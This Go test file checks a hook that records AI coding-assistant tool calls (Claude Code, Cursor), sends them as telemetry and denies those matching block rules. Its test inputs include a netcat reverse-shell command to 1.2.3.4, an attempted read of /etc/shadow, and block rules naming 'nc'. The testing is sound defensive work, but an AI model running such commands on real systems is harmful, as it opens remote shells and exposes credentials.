package hook

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/correlic/correlic-agent/internal/event"
)

// fakeBackend is an httptest telemetry plane recording what the hook sent.
type fakeBackend struct {
	srv *httptest.Server

	mu          sync.Mutex
	ingested    [][]event.Event
	blockEvents []map[string]any
	authHeaders []string
	rules       string // JSON body for /agent/block-rules
	ingestCode  int    // 0 = 202
	rulesCode   int    // 0 = 200
}

func newFakeBackend(t *testing.T) *fakeBackend {
	t.Helper()
	b := &fakeBackend{rules: `{"version":"v1","rules":[]}`}
	b.srv = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b.mu.Lock()
		defer b.mu.Unlock()
		b.authHeaders = append(b.authHeaders, r.Header.Get("Authorization"))
		switch r.URL.Path {
		case "/ingest/events":
			if b.ingestCode != 0 {
				w.WriteHeader(b.ingestCode)
				_, _ = w.Write([]byte(`{"error":"nope"}`))
				return
			}
			raw, _ := io.ReadAll(r.Body)
			var batch []event.Event
			if err := json.Unmarshal(raw, &batch); err != nil {
				var single event.Event
				if err := json.Unmarshal(raw, &single); err != nil {
					t.Errorf("bad ingest body: %s", raw)
				}
				batch = []event.Event{single}
			}
			b.ingested = append(b.ingested, batch)
			w.WriteHeader(http.StatusAccepted)
			_, _ = w.Write([]byte(`{"accepted":1,"rejected":0,"sampled":0}`))
		case "/agent/block-rules":
			if b.rulesCode != 0 {
				w.WriteHeader(b.rulesCode)
				return
			}
			w.Header().Set("Content-Type", "application/json")
			_, _ = w.Write([]byte(b.rules))
		case "/agent/block-events":
			var body struct {
				Events []map[string]any `json:"events"`
			}
			_ = json.NewDecoder(r.Body).Decode(&body)
			b.blockEvents = append(b.blockEvents, body.Events...)
			w.WriteHeader(http.StatusAccepted)
		default:
			t.Errorf("unexpected request %s %s", r.Method, r.URL.Path)
			w.WriteHeader(http.StatusNotFound)
		}
	}))
	t.Cleanup(b.srv.Close)
	return b
}

func (b *fakeBackend) events() []event.Event {
	b.mu.Lock()
	defer b.mu.Unlock()
	var all []event.Event
	for _, batch := range b.ingested {
		all = append(all, batch...)
	}
	return all
}

func testRuntime(t *testing.T, b *fakeBackend) *Runtime {
	t.Helper()
	cfg := Config{TelemetryURL: b.srv.URL, APIKey: "agent-key", AllowInsecureHTTP: true, BlockEnabled: true, CacheDir: t.TempDir()}
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("NewClient: %v", err)
	}
	return &Runtime{
		Config: cfg, Client: client, HostID: "host-xyz",
		Actor:  Actor{PID: 777, User: "alice"},
		Home:   "/home/alice",
		Logger: discardLogger(),
		Now:    func() time.Time { return time.Date(2026, 10, 8, 12, 0, 0, 0, time.UTC) },
	}
}

const claudeBashPre = `{"session_id":"sess-1","transcript_path":"/t","cwd":"/home/alice/proj","permission_mode":"default",
  "hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"%s","description":"d"},"tool_use_id":"toolu_9"}`

func TestProcess_AllowedEventIsPostedAndNothingPrinted(t *testing.T) {
	b := newFakeBackend(t)
	rt := testRuntime(t, b)
	var out bytes.Buffer
	res, err := rt.Process(context.Background(), strings.NewReader(strings.Replace(claudeBashPre, "%s", "npm test", 1)), &out)
	if err != nil {
		t.Fatalf("Process: %v", err)
	}
	if out.Len() != 0 || len(res.Output) != 0 {
		t.Errorf("allowed call must print nothing, got %q", out.String())
	}
	if !res.Delivered || res.Spooled || res.Decision.Blocked {
		t.Errorf("result = %+v", res)
	}
	evts := b.events()
	if len(evts) != 1 {
		t.Fatalf("ingested %d events", len(evts))
	}
	e := evts[0]
	if e.Type != "ai_tool_call" || e.Source != "hook" || e.HostID != "host-xyz" || e.SchemaVersion != 1 || e.ID == "" {
		t.Errorf("event = %+v", e)
	}
	if e.Actor == nil || e.Actor.PID != 777 || e.Actor.Comm != "claude" || e.Actor.User != "alice" {
		t.Errorf("actor = %+v", e.Actor)
	}
	ctx := e.Context
	if ctx["is_ai"] != true || ctx["ai_type"] != "claude-code" || ctx["ai_session_id"] != "sess-1" || ctx["command"] != "npm test" ||
		ctx["decision"] != "allowed" || ctx["phase"] != "pre" || ctx["tool_name"] != "Bash" || ctx["tool_use_id"] != "toolu_9" || ctx["cwd"] != "/home/alice/proj" {
		t.Errorf("context = %v", ctx)
	}
	if !e.Timestamp.Equal(rt.Now()) {
		t.Errorf("timestamp = %s", e.Timestamp)
	}
	b.mu.Lock()
	auth := b.authHeaders
	b.mu.Unlock()
	for _, h := range auth {
		if h != "agent-key" {
			t.Errorf("Authorization = %q", h)
		}
	}
}

func TestProcess_BlockedCommandPrintsDenyAndReports(t *testing.T) {
	b := newFakeBackend(t)
	b.rules = `{"version":"v2","rules":[{"id":12,"signal_type":"process_exec","pattern":"nc","kill_tree":false,"source":"user"}]}`
	rt := testRuntime(t, b)
	var out bytes.Buffer
	res, err := rt.Process(context.Background(), strings.NewReader(strings.Replace(claudeBashPre, "%s", "cd /tmp && nc -e /bin/sh 1.2.3.4 4444", 1)), &out)
	if err != nil {
		t.Fatalf("Process: %v", err)
	}
	if !res.Decision.Blocked || res.Decision.RuleID != 12 {
		t.Fatalf("decision = %+v", res.Decision)
	}
	var deny map[string]any
	if err := json.Unmarshal(out.Bytes(), &deny); err != nil {
		t.Fatalf("stdout is not JSON: %q", out.String())
	}
	hso, _ := deny["hookSpecificOutput"].(map[string]any)
	if hso["hookEventName"] != "PreToolUse" || hso["permissionDecision"] != "deny" {
		t.Errorf("deny doc = %v", deny)
	}
	reason, _ := hso["permissionDecisionReason"].(string)
	if !strings.Contains(reason, "#12") || !strings.Contains(reason, "nc") {
		t.Errorf("reason = %q", reason)
	}
	if strings.Count(out.String(), "\n") != 1 || !strings.HasSuffix(out.String(), "}\n") {
		t.Errorf("stdout must be exactly one JSON document: %q", out.String())
	}

	evts := b.events()
	if len(evts) != 1 || evts[0].Context["decision"] != "blocked" || evts[0].Context["block_rule_id"] != float64(12) {
		t.Errorf("blocked event = %+v", evts)
	}
	b.mu.Lock()
	be := b.blockEvents
	b.mu.Unlock()
	if len(be) != 1 {
		t.Fatalf("block events = %v", be)
	}
	if be[0]["rule_id"] != float64(12) || be[0]["signal_type"] != "process_exec" || be[0]["host_id"] != "host-xyz" ||
		be[0]["pid"] != float64(777) || be[0]["ai_type"] != "claude-code" || be[0]["success"] != true || be[0]["exe_path"] != "nc" {
		t.Errorf("block event = %v", be[0])
	}
}

func TestProcess_BlockedCursorReadUsesCursorFormat(t *testing.T) {
	b := newFakeBackend(t)
	b.rules = `{"version":"v3","rules":[{"id":3,"signal_type":"file_open","pattern":"/etc/shadow"}]}`
	rt := testRuntime(t, b)
	var out bytes.Buffer
	in := `{"hook_event_name":"beforeReadFile","conversation_id":"c1","generation_id":"g1","workspace_roots":["/w"],"file_path":"/etc/shadow"}`
	if _, err := rt.Process(context.Background(), strings.NewReader(in), &out); err != nil {
		t.Fatalf("Process: %v", err)
	}
	var deny map[string]any
	if err := json.Unmarshal(out.Bytes(), &deny); err != nil {
		t.Fatalf("stdout is not JSON: %q", out.String())
	}
	if deny["permission"] != "deny" || deny["user_message"] == "" || deny["agent_message"] == "" {
		t.Errorf("cursor deny = %v", deny)
	}
	evts := b.events()
	if len(evts) != 1 || evts[0].Context["ai_type"] != "cursor" || evts[0].Target == nil || evts[0].Target.FilePath != "/etc/shadow" {
		t.Errorf("cursor event = %+v", evts)
	}
}

func TestProcess_BlockDisabledAndPostEventsNeverDeny(t *testing.T) {
	b := newFakeBackend(t)
	b.rules = `{"version":"v2","rules":[{"id":12,"signal_type":"process_exec","pattern":"nc"}]}`
	rt := testRuntime(t, b)
	rt.Config.BlockEnabled = false
	var out bytes.Buffer
	res, _ := rt.Process(context.Background(), strings.NewReader(strings.Replace(claudeBashPre, "%s", "nc -l 1", 1)), &out)
	if res.Decision.Blocked || out.Len() != 0 {
		t.Errorf("block_enabled=false must allow: %+v %q", res.Decision, out.String())
	}
	b.mu.Lock()
	n := len(b.authHeaders)
	b.mu.Unlock()
	if n != 1 { // only the ingest call; rules were never fetched
		t.Errorf("requests = %d, want 1", n)
	}

	rt.Config.BlockEnabled = true
	out.Reset()
	post := `{"session_id":"s","transcript_path":"/t","hook_event_name":"PostToolUse","tool_name":"Bash","tool_input":{"command":"nc -l 1"},"tool_response":{"stdout":"x"}}`
	res, _ = rt.Process(context.Background(), strings.NewReader(post), &out)
	if res.Decision.Blocked || out.Len() != 0 {
		t.Errorf("post events are never denied: %+v %q", res.Decision, out.String())
	}
}

func TestProcess_RulesUnavailableAllows(t *testing.T) {
	b := newFakeBackend(t)
	b.rulesCode = http.StatusInternalServerError
	rt := testRuntime(t, b)
	var out bytes.Buffer
	res, err := rt.Process(context.Background(), strings.NewReader(strings.Replace(claudeBashPre, "%s", "nc -l 1", 1)), &out)
	if err != nil || res.Decision.Blocked || out.Len() != 0 || !res.Delivered {
		t.Errorf("res=%+v err=%v out=%q", res, err, out.String())
	}
}

func TestProcess_SpoolsOnOutageAndRetriesNextTime(t *testing.T) {
	b := newFakeBackend(t)
	rt := testRuntime(t, b)
	b.srv.Close() // backend down: connection refused

	var out bytes.Buffer
	res, err := rt.Process(context.Background(), strings.NewReader(strings.Replace(claudeBashPre, "%s", "make", 1)), &out)
	if err != nil {
		t.Fatalf("Process: %v", err)
	}
	if res.Delivered || !res.Spooled || out.Len() != 0 {
		t.Fatalf("outage: res=%+v out=%q", res, out.String())
	}
	if n := NewSpool(rt.Config.CacheDir, discardLogger()).Len(); n != 1 {
		t.Fatalf("spool len = %d", n)
	}

	// Backend back: the next invocation delivers its own event and drains the spool.
	b2 := newFakeBackend(t)
	rt2 := testRuntime(t, b2)
	rt2.Config.CacheDir = rt.Config.CacheDir
	out.Reset()
	res, err = rt2.Process(context.Background(), strings.NewReader(strings.Replace(claudeBashPre, "%s", "go test ./...", 1)), &out)
	if err != nil {
		t.Fatalf("Process #2: %v", err)
	}
	if !res.Delivered || res.Drained != 1 {
		t.Errorf("retry: res=%+v", res)
	}
	evts := b2.events()
	if len(evts) != 2 {
		t.Fatalf("ingested %d events, want 2 (own + spooled)", len(evts))
	}
	cmds := []string{evts[0].Context["command"].(string), evts[1].Context["command"].(string)}
	if cmds[0] != "go test ./..." || cmds[1] != "make" {
		t.Errorf("order = %v (own event first, then the spool)", cmds)
	}
	if n := NewSpool(rt.Config.CacheDir, discardLogger()).Len(); n != 0 {
		t.Errorf("spool not emptied: %d", n)
	}
}

func TestProcess_AuthRejectionDropsWithoutSpooling(t *testing.T) {
	b := newFakeBackend(t)
	b.ingestCode = http.StatusUnauthorized
	rt := testRuntime(t, b)
	var out bytes.Buffer
	res, err := rt.Process(context.Background(), strings.NewReader(strings.Replace(claudeBashPre, "%s", "ls", 1)), &out)
	if err != nil {
		t.Fatalf("Process: %v", err)
	}
	if res.Delivered || res.Spooled || out.Len() != 0 {
		t.Errorf("res=%+v out=%q", res, out.String())
	}
	if n := NewSpool(rt.Config.CacheDir, discardLogger()).Len(); n != 0 {
		t.Errorf("auth failures must not be spooled: %d", n)
	}
}

func TestProcess_BadInputFailsOpen(t *testing.T) {
	b := newFakeBackend(t)
	rt := testRuntime(t, b)
	var out bytes.Buffer
	if _, err := rt.Process(context.Background(), strings.NewReader("garbage"), &out); err == nil {
		t.Error("expected parse error")
	}
	if out.Len() != 0 || len(b.events()) != 0 {
		t.Errorf("nothing may be printed or sent for bad input: %q %d", out.String(), len(b.events()))
	}
}

func TestProcess_SessionEventsAreRecorded(t *testing.T) {
	b := newFakeBackend(t)
	rt := testRuntime(t, b)
	var out bytes.Buffer
	in := `{"session_id":"s9","transcript_path":"/t","cwd":"/w","hook_event_name":"SessionStart","source":"startup"}`
	res, err := rt.Process(context.Background(), strings.NewReader(in), &out)
	if err != nil || !res.Delivered || out.Len() != 0 {
		t.Fatalf("res=%+v err=%v out=%q", res, err, out.String())
	}
	e := b.events()[0]
	if e.Context["phase"] != "session" || e.Context["hook_event"] != "SessionStart" || e.Context["ai_session_id"] != "s9" {
		t.Errorf("session event = %v", e.Context)
	}
}
